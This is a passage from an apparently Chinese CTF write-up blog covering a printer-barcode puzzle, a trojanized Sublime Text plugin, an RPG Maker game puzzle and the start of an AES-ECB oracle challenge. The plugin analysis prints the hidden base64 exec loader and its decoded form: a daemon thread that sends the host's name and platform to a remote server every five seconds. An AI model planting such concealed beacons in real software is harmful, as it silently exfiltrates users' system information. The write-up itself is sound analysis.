FE3FFFFFFF0F1FF9FFFFFC41FC7FC7FF3F1FFF1FFF7C7EFCFFC7FF83FFFFFF0F9FF1FFFFFE11FC3F8FFF7F1FFF1FFF7C7EFC7FA7FF87FFFFFF0F9FE9FFFFFE31FC1F1FFE7F1FFF1FFF7E3EFE3E67FE3FFFFFFF1F8F99FFFFFF31FC403FE01F1FFF1FFF7E3EFF80E0FC7FFFFFFF1FC039FFFFFE71FC79FFFFFF1FFF1FFF7F1EFFF3EFF8FFFFFFFF1FF0F9FFFFFEF1FC7FFFFFFF1FFF1FFF7F0EFFFFFFF8FFFFFFFF1FFFF9FFFFFCF1FC7FFFFFFF1FFF1FFF7F8EFFFFFFF8FFFFFFFE1FFFF9FFFFF9F1FC7FFFFFFF1FFF1FFF7F86FFFFFFF8FF9F7FFE3FFFF9FFFFFBF1FC7FFFFFFF1FFF1FFF7FC6FFFFFFF8FF0F3FFE3FFFF9FFFFF7F1FC7FFFFFFF1FFF1FFF7FC2FFFFFFF8FF8FBFFC7FFFF9FFFFE7F1FC7FFFFFFF1FFF1FFF7FE2FFFFFFF8FF8F9FFC7FFFF9FFFFCFF1FC7FFFFFFF1FFF1FFF7FF0FFFFFFFCFF9F9FF8FFFFF9FFFF8FF1FC7FFFFFFF1FFF1FFF7FF0FFFFFFFC7F9F8FF1FFFFF9FFFF0FF0FC3FFFFFFF1FFF0FFE7FF8FFFFFFFE1E7F83E3FFFFF8FFFC03C03C0FFFFFFF03E000780FF83FFFFFFF80FFF80FFFFFF83FFFFFFFFDFFFFFFFF3FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFBFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">16</span>))[<span class=\"number\">2</span>:]</span><br><span class=\"line\">    data2 = bin(int(</span><br><span class=\"line\">        <span class=\"string\">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE38FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFDFF7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF9FF3FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF9FF3FFFFFFFFFFFFF9FFEFBFFC7FFFFFFE1FFF8FFFFFFFC3FFFFFFFFFF9FF3FF8FFFFFFFFFF0FFEFBFF39FF007F9C7FE72FFFFFF3C3FC07FFFFF87E78463F803FF01F0FFE7BFEFEFFF7FF3F3F9F8FFFFFEFF3FFBFFFFFFC01FA3F9FFBFFFE7F9FFE71FCFE7FF7FF7F9F9FCFFFFFEFFBFFBFFFFFFFC07E7F9FFBFFFE7FFFFC71F9FF3FF7FEFF9F3FCFFFFFEFFBFFBFFFFFFFFE7E7F8FFBFFFE7FFFFD75F9FF3FF7FFFFCF3FCFFFFFE7FFFFBFFFFFFFFE7E7F9FFBFFFE7FFFFD35F9FF3FF7FFFFCF3FCFFFFFE3FFFFBFFFFFFF80FE7F9FFBFFFE7FFFFD2CF9FF3FF7FFFFCF3FCFFFFFF07FFFBFFFFFFF7CFE7F3FFBFFFE7FFFFB2CF9FF3FF7FE000F3FCFFFFFFC1FFFBFFFFFFE7E7E7C7FFBFFFE7FFFFBACF9FF3FF7FE7FCF3FCFFFFFFF87FFBFFFFFFE7E7E03FFFBFFFE7FFFFB9EF9FF3FF7FE7FCF3FCFFFFFFFE7FFBFFFFFFEFE7E7FFFFBFFFE7FFFFB9E79FF3FF7FE7F9F3FCFFFFFEFF3FFBFFFFFFEFE7E7F9FFBFFFE7FFFF79E7CFE7FF7FF3F9F9F8FFFFFEFF3FFBFFFFFFE7E7F7F1FFBFFFE7F1FF79E7EFCFFF7FF3F3F9F0FFFFFE7F7FFBFFFFFF27EFF3F3FFBFFFE7F0FE38E3F39FFF7FFCE7FC04FFFFFE1CFFF9FFFFFF019FF9E7FFBFFFE7F1FFFFFFFC7FFF7FFF1FFFBCFFFFFEE3FFF87FFFFFBE7FFE1FFFBFFE00FFFFFFFFFFFFFF7FFFFFFFFCFFFFFFFFFFFFFFFFFFFFFFFFFFFFBFFFE7FFFFFFFFFFFFFF7FFFFFFFFCFFFFFFFFFFFFFFFFFFFFFFFFFFFFBFFFE7FFFFFFFFFFFFFF7FFFFFFFFCFFFFFFFFFFFFFFFFFFFFFFFFFFFFBFFFE7FFFFFFFFFFFFFF7FFFFFFFFCFFFFFFFFFFFFFFFFFFFFFFFFFFFFBFE7E7FFFFFFFFFFFFFF7FFFFFFFFCFFFFFFFFFFF3FFFFFFFFFFFFFFFFBFE7EFFFFFFFFFFFFFFF7FFFFFFFFCFFFFFFFFFFF1FFFFFFFFFFFFFFFFBFE7CFFFFFFFFFFFFFFF03FFFFFFFC3FFFFFFFFFF1FFFFFFFFFFFFFFFF81F03FFFFFFFFFFFFFFF3FFFFFFFFCFFFFFFFFFFFBFFFFFFFFFFFFFFFF9FFFFFF&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">16</span>))[<span class=\"number\">2</span>:]</span><br><span class=\"line\">    step = <span class=\"number\">208</span></span><br><span class=\"line\">    temp1 = [data1[i:i + step] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, len(data1), step)]</span><br><span class=\"line\">    print(temp1)</span><br><span class=\"line\">    print(len(temp1))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> range(<span class=\"number\">75</span>, <span class=\"number\">75</span> + <span class=\"number\">26</span> * <span class=\"number\">8</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> range(<span class=\"number\">138</span>, <span class=\"number\">138</span> + <span class=\"number\">48</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> temp1[a - <span class=\"number\">138</span>][b - <span class=\"number\">75</span>] == <span class=\"string\">&#x27;1&#x27;</span>:</span><br><span class=\"line\">                img.putpixel((b, a), (<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>))</span><br><span class=\"line\">    step = <span class=\"number\">232</span></span><br><span class=\"line\">    temp2 = [data1[i:i + step] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, len(data1), step)]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> range(<span class=\"number\">130</span>, <span class=\"number\">130</span> + <span class=\"number\">32</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> range(<span class=\"number\">579</span>, <span class=\"number\">579</span> + <span class=\"number\">29</span> * <span class=\"number\">8</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> temp2[a - <span class=\"number\">130</span>][b - <span class=\"number\">579</span>] == <span class=\"string\">&#x27;1&#x27;</span>:</span><br><span class=\"line\">                img.putpixel((b, a), (<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">drawbar()</span><br><span class=\"line\"></span><br><span class=\"line\">drawbarcode()</span><br><span class=\"line\">img.show()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure> 坐标位置弄错了，不过不影响解题，data1是flag另一半，data2不影响。 <div class=\"note info\"><p>本题flag全小写字母。</p>\r\n</div></p>\r\n<p>另附一份TSPL/TSPL2的文档。</p>\r\n<div class=\"pdfobject-container\" data-target=\"TSPL_TSPL2_Programming.pdf\" data-height=\"500px\"></div>\r\n<h1 id=\"worm-in-apple\">Worm in Apple</h1>\r\n<p>给了个压缩包，description.md的提示内容：</p>\r\n<blockquote><p>A guy I met on the Internet wanted me to test its new ST3 plugin.</p>\r\n<p>I have a bad feeling about this...</p>\r\n<p>Maybe you can tell me if I'm right to be worried?</p>\r\n<p><em>Investigate as far as you can.</em></p>\r\n</blockquote>\r\n<p>我们的目标是一个Sublime Text3（下面简称ST3）的插件。之前没玩过ST3的插件开发，看<a href=\"https://www.sublimetext.com/docs/3/packages.html\">文档</a>。文档写的很明白，sublime-package文件是个zip，包含plugin、代码片段等内容，而ST3的插件开发用的是Python。我们把给的DoxyDoxygen解压后，发现Doxy.py，打开看看，发现版权信息<code>__copyright__ = \"Copyright (c) 2015-2018 Sebastien Recio, all rights reserved\"</code>，那么题目所给插件不是自己写的，是原版改的？去Packagecontrol.io上果然有，那么就对着package-metadata.json写的版本号0.63.3下一个原版。Beyond Compare文件夹对比一下，发现题目给的插件里Doxy.py多了几行： <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    <span class=\"keyword\">import</span> base64;A=<span class=\"string\">b&#x27;IyAgICAgICAvIVwgRk9SIEVEVUNBVElPTkFMIFBVUlBPU0UgT05MWSAvIVwKQT0nNy4yemJ2LWJuMDB5cmNwNHNjdi0zcnA1MnY0OWJ2LTNuY3MyJwpCPTQ0MwpDPScwMTIzNDU2Nzg5YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXotLicKaW1wb3J0IHRpbWU7aW1wb3J0IHJlcXVlc3RzO2ltcG9ydCBwbGF0Zm9ybTtmcm9tIHV1aWQgaW1wb3J0IHV1aWQ0O2Zyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKZGVmIHcoKToKICAgIGksdT1zdHIodXVpZDQoKSksJ2h0dHBzOi8ve306e30ve30nLmZvcm1hdCgnJy5qb2luKFtDWyhDLmluZGV4KGUpLTB4MGQpJWxlbihDKV0gZm9yIGUgaW4gQV0pLEIsJycuam9pbihbY2hyKGVeMHg0MikgZm9yIGUgaW4gWzQ0LDQ1LDU0LDQzLDM2LDU5XV0pKQogICAgd2hpbGUgVHJ1ZTpyZXF1ZXN0cy5wb3N0KHUsanNvbj17J3V1aWQnOmksJ25vZGUnOnBsYXRmb3JtLm5vZGUoKSwncGxhdGZvcm0nOnBsYXRmb3JtLnBsYXRmb3JtKCl9KTt0aW1lLnNsZWVwKDUpCnQ9VGhyZWFkKHRhcmdldD13KQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOnQuc3RhcnQoKTt0LmpvaW4oKQplbHNlOnQuZGFlbW9uPVRydWU7dC5zdGFydCgpCg==&#x27;</span>;exec(base64.b64decode(A));</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure> Base64解完整理一下： <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#       /!\\\\ FOR EDUCATIONAL PURPOSE ONLY /!\\\\</span></span><br><span class=\"line\">A=<span class=\"string\">&#x27;7.2zbv-bn00yrcp4scv-3rp52v49bv-3ncs2&#x27;</span></span><br><span class=\"line\">B=<span class=\"number\">443</span></span><br><span class=\"line\">C=<span class=\"string\">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-.&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> time;<span class=\"keyword\">import</span> requests;<span class=\"keyword\">import</span> platform;<span class=\"keyword\">from</span> uuid <span class=\"keyword\">import</span> uuid4;<span class=\"keyword\">from</span> threading <span class=\"keyword\">import</span> Thread</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">w</span>():</span></span><br><span class=\"line\">    i,u=str(uuid4()),<span class=\"string\">&#x27;https://&#123;&#125;:&#123;&#125;/&#123;&#125;&#x27;</span>.format(<span class=\"string\">&#x27;&#x27;</span>.join([C[(C.index(e)<span class=\"number\">-0x0d</span>)%len(C)] <span class=\"keyword\">for</span> e <span class=\"keyword\">in</span> A]),B,<span class=\"string\">&#x27;&#x27;</span>.join([chr(e^<span class=\"number\">0x42</span>) <span class=\"keyword\">for</span> e <span class=\"keyword\">in</span> [<span class=\"number\">44</span>,<span class=\"number\">45</span>,<span class=\"number\">54</span>,<span class=\"number\">43</span>,<span class=\"number\">36</span>,<span class=\"number\">59</span>]]))</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        requests.post(u,json=&#123;<span class=\"string\">&#x27;uuid&#x27;</span>:i,<span class=\"string\">&#x27;node&#x27;</span>:platform.node(),<span class=\"string\">&#x27;platform&#x27;</span>:platform.platform()&#125;);time.sleep(<span class=\"number\">5</span>)</span><br><span class=\"line\">t=Thread(target=w)</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    t.start();t.join()</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    t.daemon=<span class=\"literal\">True</span>;t.start()</span><br></pre></td></tr></table></figure></p>\r\n<p>稍微调一下发现它会每5s向https://worm-in-apple.ctf.insecurity-insa.fr:443/notify这个地址POST方式提交一个uuid4()。</p>\r\n<p>BUUOJ上没Web端，暂时没法做了。。</p>\r\n<h1 id=\"she\">She</h1>\r\n<p>是个游戏，看Data目录一堆rxdata文件，搜一下发现是RPG Maker XP制作的，<a href=\"https://dl.3dmgame.com/patch/144142.html\">下载</a>后新建工程，保存后把工程文件放到给的She目录下即可编辑当前游戏了。</p>\r\n<p>以防万一，先调出数据库，把主角的武器伤害拉满，把敌人的血量、攻击、防御拉到最低。然后进入左下角那个房间干掉Boss，会开启一个门。进了门来到一个地牢（？），提示我们不能碰到吸血鬼，那就在地图编辑器里把ROOM1-3的吸血鬼删掉。看ROOM4的几个事件，提示<code>Magic Mirror:Combine those numbers you found in the chest and submit it with MD5 encrypt!</code>。就是让我们去找开门的顺序。然后就发现ROOM2的左边和右边的门没法开，左边的门因为没有影响0039:14变量的条件无法开，右边的门压根就没有设计开的选项。ROOM3右边的门同样，没有影响0029:4的变量，也没法开。那么剩下的门总可以开启，对应的数字按照门从左向右排列的顺序对应为213697。然后让我们算MD5，试了半天发现就是这个顺序。（yysy，没看到Bad Door造成的影响。）</p>\r\n\n    <div id=\"aplayer-XvxZWMFa\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"536307878\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{eeb61c77-b3b4-4bdc-a119-ce65a2950e3a}</p>\r\n","categories":["Writeups"],"tags":["Misc","BUUOJ","Stego","USB","打印机"]},{"title":"CSAW-Quals-2019-byte_me","url":"/2019/10/21/CSAW-Quals-2019-byte-me/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>这道题没给文件，我们连接后返回一个16进制数，然后让我们input something。我们重复输入一个字符串返回相同结果。每当输入的字符串增加16位，返回的结果增加32位。这一条可以确定这个加密方式应该是某种块加密。最容易想到的就是AES了。那么哪种加密方式？参考<a href=\"https://ctf101.org/cryptography/what-are-block-ciphers/\">这里</a>，再观察输出的密文。 <a id=\"more\"></a> <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"comment\"># context.log_level=&#x27;debug&#x27;</span></span><br><span class=\"line\">s = connect(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">8060</span>)</span><br><span class=\"line\">print(<span class=\"string\">&quot;encrypted_flag is:&quot;</span> + s.recvline())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send_message</span>(<span class=\"params\">message</span>):</span></span><br><span class=\"line\">    s.recv()</span><br><span class=\"line\">    s.sendline(message)</span><br><span class=\"line\">    s.recvline()</span><br><span class=\"line\">    encrypted = s.recvline()</span><br><span class=\"line\">    print(<span class=\"string\">&quot;Encryped &#123;0&#125; is:&#123;1&#125;.Its length is &#123;2&#125;.Message length is &#123;3&#125;&quot;</span>.format(message, encrypted, len(encrypted),</span><br><span class=\"line\">                                                                               len(message)))</span><br><span class=\"line\"></span><br><span class=\"line\">result=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">65</span>):</span><br><span class=\"line\">    send_message(<span class=\"string\">&quot;a&quot;</span>*i)</span><br></pre></td></tr></table></figure> 结果如下： <figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;python2.7 &#x2F;home&#x2F;tiaonmmn&#x2F;PycharmProjects&#x2F;python2&#x2F;byte_me.py</span><br><span class=\"line\">[+] Opening connection to 127.0.0.1 on port 8060: Done</span><br><span class=\"line\">encrypted_flag is:1e7086115a9f43410dfdcfa01702b6f4a4b6a5a081935cca7a7f38977dd21cf8eb662dc55bd5e8813ff23ad4d50d5486cdadce02d6fd6be555365a42fed846dc</span><br><span class=\"line\"></span><br><span class=\"line\">Encryped a is:ff52d314fe1306fb890d7140fe9875e882e7e524dd98fc2fdcc877222107d63a7905145edc3016646ccb0926aa5b0e38bb947ba83c0bbfdf4fb4cac0913c0401</span><br><span class=\"line\">.Its length is 130.Message length is 1</span><br><span class=\"line\">Encryped aa is:4f13a88b3aa5e816885649d346f56d5c5d5215beb0324c26e9aad9e4a180134aafef6f401eb921e4662fd9daf49487ecd83d0116094263d3ee19e605aaaacb64</span><br><span class=\"line\">.Its length is 130.Message length is 2</span><br><span class=\"line\">Encryped aaa is:e310dde5a0593baec946ab994183741aecbb45a44ca607f028486521564f62b692cfec5b59fe47e23d85f02d8fdf41d317eaef4cd0ade581266903cf6cd12741</span><br><span class=\"line\">.Its length is 130.Message length is 3</span><br><span class=\"line\">Encryped aaaa is:01abdc7751a9eea1afec0ab084e973a0b5caaeb147b989f0b3a8385fcb94c223d36f07bec80fc2c2c53238d5d331ebe59aa484ffe4338af5df49d5b18b59171c</span><br><span class=\"line\">.Its length is 130.Message length is 4</span><br><span class=\"line\">Encryped aaaaa is:28505aca54d2ef9fe91165176bb429844214d7902976d7f23049246fb1829982b991a9db4b31c76b6968ed59867220336f7d115fe99d107cc8992648881bee0b</span><br><span class=\"line\">.Its length is 130.Message length is 5</span><br><span class=\"line\">Encryped aaaaaa is:5034d975ff043ce8039993a0242950b02eb454f8fe777cd13c211683850f931d56b98aa9ae125595949e0b278aa2735ff6e3c57ff639a9dccda67e712bc4c9bc</span><br><span class=\"line\">.Its length is 130.Message length is 6</span><br><span class=\"line\">Encryped aaaaaaa is:882cab2b25bdbfe8d663b3215f6ef5d875ea0d5e5a9378aefc1c782a5a501be454c1c32ef9c518e149c3625dcfc247a50d29ba749068f3800165a8f22054dabe</span><br><span class=\"line\">.Its length is 130.Message length is 7</span><br><span class=\"line\">Encryped aaaaaaaa is:d988fe442e1e627455822e16925b4a28d00ff7ab6874a4cc61fa46fca71b726aa8cf17aa77bfb5360cb92f4fa7e7e9cdfc433c70b9ee1e78c5a5064533da8d46</span><br><span class=\"line\">.Its length is 130.Message length is 8</span><br><span class=\"line\">Encryped aaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f43eccbe78b8ae3903491e25ff706abd752b04d980aafa48393d75ff7484d5032d9c8d8d838fd5e44a9ecbc9aca2251bdb</span><br><span class=\"line\">.Its length is 130.Message length is 9</span><br><span class=\"line\">Encryped aaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f49a19a618bd564f5fb30cea8e18abac12839b7746650d3f3e9456c32e799a752ce329679aaf6adcc40556ce46ed5df1bf</span><br><span class=\"line\">.Its length is 130.Message length is 10</span><br><span class=\"line\">Encryped aaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4657c1732b2e4916e22bbf3dea339ee2dbdcaa652ec09315452cfa4b2dce4d8e52af2a3eccee542d42511f1138a6cdf73</span><br><span class=\"line\">.Its length is 130.Message length is 11</span><br><span class=\"line\">Encryped aaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4d811b161afce4939967a4ae2a83c89b516a1ab0b723c549a8ea67b026444c8bc8a32af103de992b41efe193e5c2576deea95fe196998951a0f598a2e519925c7</span><br><span class=\"line\">.Its length is 162.Message length is 12</span><br><span class=\"line\">Encryped aaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4e3eeb89f4ba128ce311b33787865b5d94ddc0480866840c8c811f80e1047ef216ffa19a23acfb23d21a49c6c90d027811d0f00affdfce4afa4b025d4457bd595</span><br><span class=\"line\">.Its length is 162.Message length is 13</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f459994a644d4aa519ead145821fa949b4e89e7c11851ae0d640631af0bdbeee8b73cfc452c87afa74e86731fe31c8558492adf99e7a0c109c5cb662db35c0ea5b</span><br><span class=\"line\">.Its length is 162.Message length is 14</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f48cef101955556e5bcd064d2dcfcbbc421b182df74863e95ca0d83e75b6ce8b977e7cab1ba0f113d3fe6bc2409006e35829b76a13f2a170c50eaeffb470c38a60</span><br><span class=\"line\">.Its length is 162.Message length is 15</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f46885b4e75c3d47d0dfeabd65836cf329a4b6a5a081935cca7a7f38977dd21cf8eb662dc55bd5e8813ff23ad4d50d5486cdadce02d6fd6be555365a42fed846dc</span><br><span class=\"line\">.Its length is 162.Message length is 16</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4f42e62f15dc036e1a09c389250015c1982e7e524dd98fc2fdcc877222107d63a7905145edc3016646ccb0926aa5b0e38bb947ba83c0bbfdf4fb4cac0913c0401</span><br><span class=\"line\">.Its length is 162.Message length is 17</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4e6430275a9bb274ee7e37b860e8d8a065d5215beb0324c26e9aad9e4a180134aafef6f401eb921e4662fd9daf49487ecd83d0116094263d3ee19e605aaaacb64</span><br><span class=\"line\">.Its length is 162.Message length is 18</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4351e8889f4291b6d56c7e894aab91a48ecbb45a44ca607f028486521564f62b692cfec5b59fe47e23d85f02d8fdf41d317eaef4cd0ade581266903cf6cd12741</span><br><span class=\"line\">.Its length is 162.Message length is 19</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f49579199f4e69346a5fdc11d2e593c80ab5caaeb147b989f0b3a8385fcb94c223d36f07bec80fc2c2c53238d5d331ebe59aa484ffe4338af5df49d5b18b59171c</span><br><span class=\"line\">.Its length is 162.Message length is 20</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f469bc2c9ea8182813544ba55ab1a963014214d7902976d7f23049246fb1829982b991a9db4b31c76b6968ed59867220336f7d115fe99d107cc8992648881bee0b</span><br><span class=\"line\">.Its length is 162.Message length is 21</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4d19681425feb1a0d02fdbe35823e06242eb454f8fe777cd13c211683850f931d56b98aa9ae125595949e0b278aa2735ff6e3c57ff639a9dccda67e712bc4c9bc</span><br><span class=\"line\">.Its length is 162.Message length is 22</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f44bfa35fb255a71e08d82e8a75317654475ea0d5e5a9378aefc1c782a5a501be454c1c32ef9c518e149c3625dcfc247a50d29ba749068f3800165a8f22054dabe</span><br><span class=\"line\">.Its length is 162.Message length is 23</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4dd9e5d3a378726db3c0b9e92b4a35d86d00ff7ab6874a4cc61fa46fca71b726aa8cf17aa77bfb5360cb92f4fa7e7e9cdfc433c70b9ee1e78c5a5064533da8d46</span><br><span class=\"line\">.Its length is 162.Message length is 24</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a993eccbe78b8ae3903491e25ff706abd752b04d980aafa48393d75ff7484d5032d9c8d8d838fd5e44a9ecbc9aca2251bdb</span><br><span class=\"line\">.Its length is 162.Message length is 25</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a999a19a618bd564f5fb30cea8e18abac12839b7746650d3f3e9456c32e799a752ce329679aaf6adcc40556ce46ed5df1bf</span><br><span class=\"line\">.Its length is 162.Message length is 26</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99657c1732b2e4916e22bbf3dea339ee2dbdcaa652ec09315452cfa4b2dce4d8e52af2a3eccee542d42511f1138a6cdf73</span><br><span class=\"line\">.Its length is 162.Message length is 27</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99d811b161afce4939967a4ae2a83c89b516a1ab0b723c549a8ea67b026444c8bc8a32af103de992b41efe193e5c2576deea95fe196998951a0f598a2e519925c7</span><br><span class=\"line\">.Its length is 194.Message length is 28</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99e3eeb89f4ba128ce311b33787865b5d94ddc0480866840c8c811f80e1047ef216ffa19a23acfb23d21a49c6c90d027811d0f00affdfce4afa4b025d4457bd595</span><br><span class=\"line\">.Its length is 194.Message length is 29</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a9959994a644d4aa519ead145821fa949b4e89e7c11851ae0d640631af0bdbeee8b73cfc452c87afa74e86731fe31c8558492adf99e7a0c109c5cb662db35c0ea5b</span><br><span class=\"line\">.Its length is 194.Message length is 30</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a998cef101955556e5bcd064d2dcfcbbc421b182df74863e95ca0d83e75b6ce8b977e7cab1ba0f113d3fe6bc2409006e35829b76a13f2a170c50eaeffb470c38a60</span><br><span class=\"line\">.Its length is 194.Message length is 31</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a996885b4e75c3d47d0dfeabd65836cf329a4b6a5a081935cca7a7f38977dd21cf8eb662dc55bd5e8813ff23ad4d50d5486cdadce02d6fd6be555365a42fed846dc</span><br><span class=\"line\">.Its length is 194.Message length is 32</span><br><span class=\"line\">Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99f42e62f15dc036e1a09c389250015c1982e7e524dd98fc2fdcc877222107d63a7905145edc3016646ccb0926aa5b0e38bb947ba83c0bbfdf4fb4cac0913c0401</span><br><span class=\"line\">.Its length is 